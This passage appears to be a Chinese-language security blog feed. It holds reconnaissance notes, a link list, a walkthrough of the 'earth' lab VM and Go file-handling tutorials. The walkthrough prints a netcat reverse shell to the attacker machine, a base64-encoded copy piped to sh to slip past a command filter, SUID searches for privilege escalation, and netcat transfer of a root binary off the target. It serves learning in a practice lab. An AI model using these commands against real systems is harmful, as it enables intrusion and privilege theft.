http(s):&#x2F;&#x2F;{name}.s3.amazonaws.com，其中 {name} 由所有者决定，如 tryhackme-assets.s3.amazonaws.com。发现 S3 存储桶的方法有很多，例如在网站页面源代码、GitHub 存储库中查找 URL，甚至自动完成该过程。一种常见的自动化方法是使用公司名称后的常用术语，如{name}-assets、{name}-www、{name}-public、{name}-private等。</p><h1 id="目录-子域名"><a href="#目录-子域名" class="headerlink" title="目录,子域名"></a>目录,子域名</h1><p>之前提过,gobuster,ffuf,dirb</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://10.10.37.125/FUZZ<br><br>dirb http://10.10.37.125/ /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt<br><br>gobuster <span class="hljs-built_in">dir</span> --url http://10.10.37.125/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt<br></code></pre></td></tr></table></figure><p>也遇到过之前的问题,有些机器SecLists中的字母全是小写的,thm机器就是这样,但是给的实例是大写的</p><h1 id="子域名枚举"><a href="#子域名枚举" class="headerlink" title="子域名枚举"></a>子域名枚举</h1><h2 id="Brute-Force暴力破解"><a href="#Brute-Force暴力破解" class="headerlink" title="Brute Force暴力破解"></a>Brute Force暴力破解</h2><h3 id="上面的ffuf"><a href="#上面的ffuf" class="headerlink" title="上面的ffuf"></a>上面的ffuf</h3><p>把fuzz放在域名前就可以</p><h3 id="dnsrecon"><a href="#dnsrecon" class="headerlink" title="dnsrecon"></a>dnsrecon</h3><p>dnsrecon -d 域名</p><p>用了下感觉不咋地</p><h2 id="OSINT-Open-Source-Intelligence-开源情报"><a href="#OSINT-Open-Source-Intelligence-开源情报" class="headerlink" title="OSINT (Open-Source Intelligence) 开源情报"></a>OSINT (Open-Source Intelligence) 开源情报</h2><h3 id="证书机构"><a href="#证书机构" class="headerlink" title="证书机构"></a>证书机构</h3><p><code>https://crt.sh/</code></p><p>在这里面查询主站,可以发现主站下有证书的子域</p><h3 id="google语法"><a href="#google语法" class="headerlink" title="google语法"></a>google语法</h3><p><code>site:thm.com</code>一般会查到主站下的各种目录,如果内容很多的话子域名查找很麻烦</p><p><code>site:*.thm.com</code>这样就ok了</p><h3 id="sublist3r"><a href="#sublist3r" class="headerlink" title="sublist3r"></a>sublist3r</h3><p>按理说应该是个爆破工具,不知道为什么归属到开源情报了</p><p><code>./sublist3r.py -d acmeitsupport.thm</code></p><p>这个kali没有自带,需要自己下载</p><p><a href="https://blog.csdn.net/zsw15841822890/article/details/107556319">Sublist3r使用教程-子域名扫描工具_Hacking黑白红的博客-CSDN博客</a></p><h2 id="Virtual-Host虚拟主机"><a href="#Virtual-Host虚拟主机" class="headerlink" title="Virtual Host虚拟主机"></a>Virtual Host虚拟主机</h2><p>很恶心的一个概念</p><p><code>ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H &quot;Host: FUZZ.acmeitsupport.thm&quot; -u http://MACHINE_IP</code></p><p><img src="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230821123543.png"></p><p>查出来以后可能会有非常多内容,比如example1.acmeitsupport.thm的响应size是1234,而example2222.acmeitsupport.thm的响应size是5678,如果我只想看example1.acmeitsupport.thm的,那就可以</p><p><code>ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H &quot;Host: FUZZ.acmeitsupport.thm&quot; -u http://MACHINE_IP -fs 5678</code>屏蔽掉example2222.acmeitsupport.thm</p>]]></content>
    
    
    <categories>
      
      <category>thm</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>资源</title>
    <link href="/2023/08/20/%E8%B5%84%E6%BA%90/"/>
    <url>/2023/08/20/%E8%B5%84%E6%BA%90/</url>
    
    <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs bash">52破解<br>www.52pojie.cn<br><br>java<br>https://www.oracle.com/cn/java/technologies/javase/javase8-archive-downloads.html<br><br>win镜像<br>https://www.microsoft.com/zh-cn/software-download/windows11<br><br>golang教程<br>https://github.com/astaxie/build-web-application-with-golang/blob/master/zh/preface.md<br><br>微步<br>https://x.threatbook.com/<br><br>骨哥博客<br>https://mybeibei.net/<br><br>社工包<br>https://www.freebuf.com/sectool/339350.html<br><br>icon库<br>https://pictogrammers.com/library/mdi/<br><br>咕咕鸽blog<br>blog.laoda.de<br><br>gpt_token<br>https://ai.fakeopen.com/auth1<br><br>随机密码生成器<br>https://1password.com/zh-cn/password-generator/<br><br>vps<br>racknerd.com<br><br>曾哥博客<br>https://blog.zgsec.cn/<br><br>fofa<br>fofa.info<br><br>shellclash<br>https://juewuy.github.io/clash-for-miwifi-an-zhuang-ji-shi-yong-jiao-cheng/<br><br>golang中文库<br>https://studygolang.com/pkgdoc<br><br>yandex搜图<br>yandex.com<br><br>favicon库<br>https://wiki.owasp.org/index.php/OWASP_favicon_database<br><br>哈希库<br>https://crackstation.net/<br><br><span class="hljs-built_in">base64</span>在线解码编码<br>https://www.base64encode.org/<br><br>网站之前的样子<br>https://archive.org/web/<br><br>群主自用hackbar <br>https://chrome.google.com/webstore/detail/ginpbkfigcoaokgflihfhhmglmbchinc<br><br>中科大镜像站<br>http://mirrors.ustc.edu.cn/<br><br>go_web<br>https://github.com/astaxie/build-web-application-with-golang/blob/master/zh/preface.md<br><br>文件对应幻字<br>https://en.wikipedia.org/wiki/List_of_file_signatures<br><br>go中文文档<br>https://www.topgoer.com/<br><br>go社区<br>https://gocn.vip/c/3lQ6GbD5ny/home<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>资源</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>earth</title>
    <link href="/2023/08/20/earth/"/>
    <url>/2023/08/20/earth/</url>
    
    <content type="html"><![CDATA[<h1 id="earth"><a href="#earth" class="headerlink" title="earth"></a>earth</h1><h2 id="ip发现"><a href="#ip发现" class="headerlink" title="ip发现"></a>ip发现</h2><p>(攻击机和靶机都使用nat模式,保证处于同一ip段)</p><p>ifconfig</p><p><img src="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230606163159.png"></p><p>发现攻击机ip段为192.168.22</p><p>使用nmap -sP 192.168.22.1&#x2F;24</p><h3 id="sP-scan-ping"><a href="#sP-scan-ping" class="headerlink" title="-sP  scan ping"></a>-sP  scan ping</h3><p>使用ping扫描网段,仅查看哪些网段内哪些主机在线,不查看端口,速度更快</p><h3 id="192-168-22-1-24"><a href="#192-168-22-1-24" class="headerlink" title="192.168.22.1&#x2F;24"></a>192.168.22.1&#x2F;24</h3><p>192.168.22是网段,129代表着攻击机,而靶机也处于同一网段,所以此时网关为255.255.255.0,换算成2进制就是24个1和8个0,&#x2F;24就代表着网关为255.255.255.0,所以192.168.22此时为主机号,nmap会只扫描192.168.22.1 - 192.168.22.254这些主机(0作为网络地址,不可用于主机段,255用于广播地址,同样不能用于主机地址)(192.168.22.1的1可以更改为任何一个数字,因为有&#x2F;24,所以会全部扫完)</p><p><img src="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230606165237.png"></p><p>发现靶机ip为132</p><h2 id="基础信息发现"><a href="#基础信息发现" class="headerlink" title="基础信息发现"></a>基础信息发现</h2><p>namp -A 192.168.22.132</p><h3 id="A"><a href="#A" class="headerlink" title="-A"></a>-A</h3><p>会执行以下扫描</p><ol>    <li>ping扫描</li>    <li>端口扫描</li>    <li>OS扫描(猜测目标主机操作系统)</li>    <li>版本检测</li></ol><p><img src="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230606191509.png"></p><h4 id="端口发现"><a href="#端口发现" class="headerlink" title="端口发现"></a>端口发现</h4><p>靶机现在开放了-22(ssh原创登录)端口,-80(http协议端口),-443(https)协议端口</p><h4 id="DNS解析"><a href="#DNS解析" class="headerlink" title="DNS解析"></a>DNS解析</h4><p>用了两个DNS服务器</p><p><img src="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230606182257.png"></p><p><img src="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230606182314.png"><img src="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230606182335.png"></p><p><img src="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230606182422.png"></p><p><img src="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230606182455.png"></p><p><img src="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230606182519.png"></p><h4 id="OS发现"><a href="#OS发现" class="headerlink" title="OS发现"></a>OS发现</h4><p>靶机运行的是linux系统</p><h4 id="添加本地DNS"><a href="#添加本地DNS" class="headerlink" title="添加本地DNS"></a>添加本地DNS</h4><p>(有些情况可能只允许域名访问而不允许ip地址访问,所以这一步是有必要的)</p><p>vim &#x2F;etc&#x2F;hosts</p><p>按i进行输入</p><p><code>192.168.22.132 earth.local terratest.earth.local</code></p><p>按esc退出</p><p>:wq保存(write quit)</p><p>接着就可以在网页访问earth.local了</p><h3 id="1-dirb-Directory-Bruteforcing"><a href="#1-dirb-Directory-Bruteforcing" class="headerlink" title="(1)dirb(Directory Bruteforcing)"></a>(1)dirb(Directory Bruteforcing)</h3><p>目录枚举工具</p><p>dirb <a href="http://earth.local/">http://earth.local</a></p><p><img src="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230606193100.png"></p><p>发现有admin和cgi-bin两个文件夹(只能找到顶级文件夹,比如admin内还有login文件夹,因为不是顶级,所以扫不出来)</p><p>因为-80和-443端口都开放了,所以http  https  earth.local terratest.earth.local  都要扫一遍</p><h3 id="2-gobuster"><a href="#2-gobuster" class="headerlink" title="(2)gobuster"></a>(2)gobuster</h3><p>dirb每次只能一个网站一个网站扫,过于繁琐,所以使用gobuster来扫描,http和https最好分开扫描</p><p><code>gobuster dir -u https://earth.local -u https://terratest.earth.local -k  -w /root/桌面/gobuster/SecLists/Discovery/Web-Content/common.txt</code></p><p><code>gobuster dir -u http://earth.local -u http://terratest.earth.local -w /root/桌面/gobuster/SecLists/Discovery/Web-Content/common.txt</code></p><p><code>gobuster dir -u &lt;url&gt; -k(如果有https则需要加上-k) -w &lt;字典路径&gt;</code></p><p><img src="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230607161245.png"></p><p>在https扫出了相对有用的,index.html进去是一句话,而robots.txt进去是目录,在最下面一行找到可能有用的<img src="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230607161400.png"></p><p>文件名是testingnotes.*    *是通配符,需要猜测后缀,一般可能为</p><ol>    <li>  .md</li>    <li>  .txt</li>    <li>  .dox</li>    <li>  .html</li>    <li>  .php</li></ol><p>这里后缀为.txt</p><p><img src="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230607161811.png"></p><p>第二行使用XOR encryption(异或加密算法)</p><p><img src="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230607164350.png"></p><p>第四行testdata.txt是被用来测试加密的</p><p>todo上方一行表明earth靶机的用户名是terra</p><h3 id="下载testdata-txt"><a href="#下载testdata-txt" class="headerlink" title="下载testdata.txt"></a>下载testdata.txt</h3><p>因为是https,未经过验证ssl证书,所以使用wget直接下载的情况</p><figure class="highlight plaintext"><figcaption><span>https://terratest.earth.local/testdata.txt```会报错,</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs wget"><br>所以要忽略不可信证书强行下载<br><br>```wget https://terratest.earth.local/testdata.txt --no-check-certificate```<br><br>(能使用wget下载就是因为80和443端口开放)<br><br>### 解码<br><br>使用[CyberChef (gchq.github.io)](https://gchq.github.io/CyberChef/)在线平台进行解码<br><br>datatest.txt(A)进行了一次测试,与密钥(B)进行XOR生成了earth.local首页的C,现在用C和A进行XOR操作获取密钥B<br><br>```2402111b1a0705070a41000a431a000a0e0a0f04104601164d050f070c0f15540d1018000000000c0c06410f0901420e105c0d074d04181a01041c170d4f4c2c0c13000d430e0e1c0a0006410b420d074d55404645031b18040a03074d181104111b410f000a4c41335d1c1d040f4e070d04521201111f1d4d031d090f010e00471c07001647481a0b412b1217151a531b4304001e151b171a4441020e030741054418100c130b1745081c541c0b0949020211040d1b410f090142030153091b4d150153040714110b174c2c0c13000d441b410f13080d12145c0d0708410f1d014101011a050d0a084d540906090507090242150b141c1d08411e010a0d1b120d110d1d040e1a450c0e410f090407130b5601164d00001749411e151c061e454d0011170c0a080d470a1006055a010600124053360e1f1148040906010e130c00090d4e02130b05015a0b104d0800170c0213000d104c1d050000450f01070b47080318445c090308410f010c12171a48021f49080006091a48001d47514c50445601190108011d451817151a104c080a0e5a```<br><br>这段字符串是 16 进制编码的二进制数据,具有以下特征:1. 只包含数字 0-9 和字母 A-F16 进制使用 0-9 和 A-F 表示数值,所以 16 进制编码的数据只会包含这些字符。<br><br>所以先把这段转化成二进制,然后跟datatest.txt的内容进行XOR,发现密钥B为earthclimatechangebad4humans<br><br>### 登陆<br><br>![](https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230607173526.png)<br><br>用户名为terra,密码尝试使用earthclimatechangebad4humans,成功登陆<br><br>&lt;ol&gt;<br>    &lt;li&gt;ls&lt;/li&gt;<br>    &lt;li&gt;whoami&lt;/li&gt;<br>    &lt;li&gt;locate password&lt;/li&gt;<br>    &lt;li&gt;locate flag&lt;/li&gt;<br>&lt;/ol&gt;<br><br><br>发现flag      ```user_flag_3353b67d6437f07ba7d34afd7d2fc27d```<br><br><br><br>### 提权<br><br>反弹shell,使用```nc 192.168.22.129 4444 -e /bin/sh```,显示被禁止,可能是有过滤器,所以将```nc 192.168.22.129 4444 -e /bin/sh```进行base64编码(别人用的都是base64编码,但编码成别的应该也可以),在页面输入```echo &#x27;bmMgMTkyLjE2OC4yMi4xMjkgNDQ0NCAtZSAvYmluL3No&#x27; | base64 -d | sh```<br><br>-d decode 解码<br><br>sh 将前面的代码当作一个命令来执行<br><br><br><br></code></pre></td></tr></table></figure><p>find &#x2F; -user root -perm &#x2F;4000 2&gt;&#x2F;dev&#x2F;null<br>find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</p><pre><code class="hljs">网上搜到的两种搜索提权文件的代码find [范围] [选项] (范围可不写)#### 1.find / -user root -perm /4000 2&gt;/dev/null&lt;ol&gt;    &lt;li&gt;/&lt;/li&gt;范围在根目录    &lt;li&gt;-user root&lt;/li&gt;选定属主为root    &lt;li&gt;-perm /4000&lt;/li&gt;permission意味权限,-perm后面要带有具体范围,/4000是SUID的八进制位形式    &lt;ul&gt;        &lt;li&gt;属主&lt;/li&gt;文件或目录的创始者        &lt;li&gt;属组&lt;/li&gt;一种权限分划方式,同一个属组内的用户可以共享文件的读写删改操作权限,比如a,b,c三个用户,a,b为一个属组,c不属于a,b的属组,a创建了一个文件,b具有跟a等同的对该文件操作的权力,而c没有(注意普通用户跟root用户同一属组时不具备root的权限)        &lt;li&gt;SUID&lt;/li&gt;Set User Id,当一个目录或文件具有SUID时,代表该文件在执行时可以允许普通用户拥有root权限    &lt;/ul&gt;    所以第二条和第三条联合起来就是查找root用户创建的文件,并且该文件可以让低权限用户使用root权限    &lt;li&gt;2&gt;/dev/null&lt;/li&gt; &gt;是重定向符号,让报错信息输入到/dev/null中    &lt;ul&gt;        &lt;li&gt;0&lt;/li&gt;标准输入(Stdin):文件描述符为 0,使用 &lt; 重定向        &lt;li&gt;1&lt;/li&gt;标准输出(Stdout):文件描述符为 1,使用 &gt; 重定向         &lt;li&gt;2&lt;/li&gt;标准错误输出(Stderr):文件描述符为 2,使用 2&gt; 重定向         &lt;li&gt;/dev/null&lt;/li&gt;/dev/null 是 Linux 中的一个特殊文件,写入到它的内容都会被丢弃。    &lt;/ul&gt;    所以该命令效果是不显示报错信息&lt;/ol&gt;#### 2.find / -perm -u=s -type f 2&gt;/dev/null-u=s和-u /4000等效  s就是suid -type代表筛选文件类型,f是regular file,即普通文件#### 传输文件![](https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230607210637.png)发现reset_root,但是报错,直接打开是乱码strings /usr/bin/reset_root         把二进制文件转化成可阅读文本发现该文件将更改密码为earth这个文件发送到攻击机进行分析##### 攻击机开端口 nc -nlvp 1234 &gt; reset_root               开启1234端口,创建名为reset_root的文件接受数据(-n是不进行dns查询)##### 靶机nc 192.168.22.129 1234 &lt; /usr/bin/reset_root#### 执行chmod +x reset_root      change mode更改文件权限,x是execute,即将该文件修改为允许执行的文件ltrace ./reset_root    (library trace库追踪)即追踪执行这个文件需要调用什么样的动态库(函数)(这里用strace更好点,&quot;strace&quot; 中的 &quot;s&quot;，它代表的是 &quot;system calls&quot;（系统调用）。strace 工具的主要功能就是追踪程序执行期间发生的系统调用，以及这些调用的参数和返回值。它可以捕获程序与操作系统之间的交互，包括文件操作、网络通信、进程管理等系统调用。)(这里有坑,我是在桌面新建了一个文件夹用于接收该文件,为了方便我进文件夹后右键在该位置打开终端,但是直接用ltrace rest_root会报错,用./reset_root就可以,   ./ 代表着当前文件夹的路径,这里很怪,注意一下吧)应该就是靶机上没有这三个文件,所以创建一下(touch创建)创建完后发现root密码是Earth,su Earth升级权限(这里输入密码没有被隐藏,搞得我还以为有啥问题)whoami   此时为root继续find root_flag</code></pre>]]></content>
    
    
    <categories>
      
      <category>安全</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>go进阶</title>
    <link href="/2023/08/20/go%E8%BF%9B%E9%98%B6/"/>
    <url>/2023/08/20/go%E8%BF%9B%E9%98%B6/</url>
    
    <content type="html"><![CDATA[<h1 id="go进阶"><a href="#go进阶" class="headerlink" title="go进阶"></a>go进阶</h1><h2 id="time包"><a href="#time包" class="headerlink" title="time包"></a>time包</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go">time.Now()  <span class="hljs-comment">//当前时间  2023-08-08 11:15:02.0855663 +0800 CST m=+0.001233401</span><br><span class="hljs-comment">//打印选定时间,年月日时分秒纳秒时区</span><br>t2:=time.Date(<span class="hljs-number">2004</span>,<span class="hljs-number">1</span>,<span class="hljs-number">15</span>,<span class="hljs-number">8</span>,<span class="hljs-number">26</span>,<span class="hljs-number">22</span>,<span class="hljs-number">0</span>,time.Local)<br>fmt.Println(t2)<br><span class="hljs-comment">//2023-08-08 11:17:30.3234989 +0800 CST m=+0.001020901</span><br>h, m, s := time.Now().Clock()<br>fmt.Println(h, m, s)<br><span class="hljs-comment">//11 28 30</span><br></code></pre></td></tr></table></figure><h2 id="file操作"><a href="#file操作" class="headerlink" title="file操作"></a>file操作</h2><p>都用os包</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go">Fileinfo   <span class="hljs-comment">//返回文件信息和错误值</span><br><br></code></pre></td></tr></table></figure><h3 id="权限"><a href="#权限" class="headerlink" title="权限"></a>权限</h3><p>r       w     x</p><p>读    写    可执行</p><p>如果没有的话就是-</p><p>-文件 d目录 |连接符</p><p>-rwx r-x r-x</p><p>-代表文件 rwx代表可读可写可执行   两个r-x分别代表所属组和其它人的权限</p><p>八进制表现</p><p>r–&gt;004</p><p>w–&gt;002</p><p>x–&gt;001</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs -```-->000"><br>chomd +x 777     中的777的7就是4+2+1,可读可写可执行<br><br>```go<br>package main<br><br>import (<br>&quot;fmt&quot;<br>&quot;os&quot;<br>)<br><br>func main() &#123;<br>err := os.Mkdir(&quot;./testss&quot;, 0777)<br>if err != nil &#123;<br>fmt.Println(err)<br>&#125;<br>fmt.Println(&quot;创建成功&quot;)<br>file, err := os.Create(&quot;123.txt&quot;)<br>if err != nil &#123;<br>fmt.Println(err)<br>&#125;<br>fmt.Println(file) //&amp;&#123;0xc00011c780&#125;<br>//open是打开文件并建立连接的操作,open打开的文件的权限是只读<br>file2, err := os.Open(&quot;D:/桌面/hack/if_open.txt&quot;)<br>if err != nil &#123;<br>fmt.Println(err)<br>&#125;<br>fmt.Println(file2) //打开文件地址  &amp;&#123;0xc00011ca00&#125;<br>//关闭文件<br>err = file2.Close()<br>if err != nil &#123;<br>fmt.Println(err)<br>return<br>&#125;<br>fmt.Println(&quot;关闭成功&quot;)<br>    //删除目录或文件 (不放入回收站,慎用)<br>err = os.Remove(&quot;D:/桌面/hack/if_open.txt&quot;)<br>if err != nil &#123;<br>fmt.Println(err)<br>return<br>&#125;<br>fmt.Println(&quot;删除成功&quot;)<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="IO操作"><a href="#IO操作" class="headerlink" title="IO操作"></a>IO操作</h2><p>input output</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;io&quot;</span><br><span class="hljs-string">&quot;os&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>fn := <span class="hljs-string">&quot;D:/桌面/hack/test.txt&quot;</span><br>file, err := os.Open(fn)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>fmt.Println(err)<br>&#125;<br>bs := <span class="hljs-built_in">make</span>([]<span class="hljs-type">byte</span>, <span class="hljs-number">10</span>)<br>n, err := file.Read(bs)<br>fmt.Println(<span class="hljs-string">&quot;这是err&quot;</span>, err)<br>fmt.Println(n)<br>fmt.Println(bs)<br>fmt.Println(<span class="hljs-type">string</span>(bs))<br><span class="hljs-comment">//读取完整文件</span><br>i := <span class="hljs-number">-1</span><br><span class="hljs-keyword">for</span> &#123;<br>i, err = file.Read(bs) <span class="hljs-comment">//n是实际读取的字节数</span><br><span class="hljs-keyword">if</span> i == <span class="hljs-number">0</span> || err == io.EOF &#123;<br>fmt.Println(<span class="hljs-string">&quot;文件读取结束&quot;</span>)<br><span class="hljs-keyword">break</span><br>&#125;<br>fmt.Println(<span class="hljs-string">&quot;i现在是&quot;</span>, i, <span class="hljs-type">string</span>(bs[:i]))<br>&#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="ioutil包"><a href="#ioutil包" class="headerlink" title="ioutil包"></a>ioutil包</h3><p>现在新版本golang里ioutil包已经被os和io包吞并了</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;os&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>filename := <span class="hljs-string">&quot;D:/桌面/hack/test.txt&quot;</span><br>data, err := os.ReadFile(filename)<br>    <span class="hljs-comment">//完整读取文件内容</span><br>fmt.Println(<span class="hljs-type">string</span>(data)) <span class="hljs-comment">//wedfvujabxqwbkdxq64135qpdqwgdq5dqgkuw2541dqw</span><br>fmt.Println(err)  <span class="hljs-comment">//nil</span><br>fmt.Printf(<span class="hljs-string">&quot;%T  %T&quot;</span>, data, err)<span class="hljs-comment">//[]uint8  &lt;nil&gt;</span><br>    s := <span class="hljs-string">&quot;这是测试还是覆盖&quot;</span><br>err = os.WriteFile(filename, []<span class="hljs-type">byte</span>(s), os.ModePerm) <span class="hljs-comment">//这是覆盖函数,不是增加内容</span><br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>fmt.Println(err)<br><span class="hljs-keyword">return</span><br>&#125;<br>fmt.Println(<span class="hljs-string">&quot;成功写入&quot;</span>)<br>dirname := <span class="hljs-string">&quot;D:/桌面/hack&quot;</span><br>dirinfo, err := os.ReadDir(dirname)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>fmt.Println(err)<br><span class="hljs-keyword">return</span><br>&#125;<br>fmt.Printf(<span 